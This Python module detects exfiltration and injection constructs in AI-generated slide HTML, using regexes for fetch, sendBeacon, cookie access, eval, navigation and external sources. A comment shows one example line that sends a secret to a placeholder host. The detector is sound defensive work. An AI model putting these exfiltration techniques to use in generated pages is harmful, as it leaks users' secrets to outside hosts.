"""Scan LLM-generated slide HTML/JS for exfiltration / injection patterns.

AISEC-248 PR1: detection layer. Runtime enforcement is the CSP injected by the
frontend slide-document builder; this module rejects + logs at generation time.
Legitimate slides never use these constructs (chart data is inlined, images are
data: URIs), so any hit is off-path.
"""

import re
from typing import List

# Script sources allowed in slides (Chart.js + Tailwind Play CDN).
_ALLOWED_SCRIPT_HOSTS = ("https://cdn.jsdelivr.net", "https://cdn.tailwindcss.com")

# (label, compiled regex). Order is stable for predictable reporting.
#
# Navigation / redirect patterns matter because CSP cannot reliably block a frame
# navigating itself (the `navigate-to` directive was dropped from CSP3). A slide
# could otherwise exfiltrate via `window.location = "https://x/?d=" + secret`, a
# `window.open`, or a `<meta http-equiv="refresh" url=...>`. Legitimate slides
# never navigate, so flagging these is high-precision. (Prose like "Sales by
# location" or "navigate the report" does not match — the patterns require the
# JS member-access / assignment forms, not the bare words.)
_PATTERNS = [
    ("fetch", re.compile(r"\bfetch\s*\(")),
    ("XMLHttpRequest", re.compile(r"\bXMLHttpRequest\b")),
    ("navigator.sendBeacon", re.compile(r"\bnavigator\s*\.\s*sendBeacon\b")),
    ("document.cookie", re.compile(r"\bdocument\s*\.\s*cookie\b")),
    ("eval", re.compile(r"\beval\s*\(")),
    ("new Function", re.compile(r"\bnew\s+Function\s*\(")),
    ("form action", re.compile(r"<form\b[^>]*\baction\s*=", re.IGNORECASE)),
    # navigation: assigning to (window|document).location or .location.href
    ("navigation: location assignment",
     re.compile(r"\b(?:window|document)\s*\.\s*location\b\s*(?:\.\s*href\s*)?=")),
    # navigation: location.href/.assign()/.replace() (with or without window/document prefix)
    ("navigation: location.href/assign/replace",
     re.compile(r"\blocation\s*\.\s*(?:href\s*=|assign\s*\(|replace\s*\()")),
    ("navigation: window.open", re.compile(r"\bwindow\s*\.\s*open\s*\(")),
    # redirect: <meta http-equiv="refresh" ...>
    ("meta refresh redirect",
     re.compile(r"<meta\b[^>]*http-equiv\s*=\s*['\"]?\s*refresh", re.IGNORECASE)),
]

# External resource references (img/script src to an http(s) URL).
_EXTERNAL_SRC = re.compile(r"<(?:img|script)\b[^>]*\bsrc\s*=\s*['\"](https?://[^'\"]+)", re.IGNORECASE)


def scan_html_for_unsafe_patterns(html: str) -> List[str]:
    """Return a list of human-readable findings; empty list means clean."""
    if not html:
        return []

    findings: List[str] = []

    for label, pattern in _PATTERNS:
        if pattern.search(html):
            findings.append(f"unsafe pattern: {label}")

    for match in _EXTERNAL_SRC.finditer(html):
        url = match.group(1)
        if not url.lower().startswith(_ALLOWED_SCRIPT_HOSTS):
            findings.append(f"external resource src: {url}")

    return findings
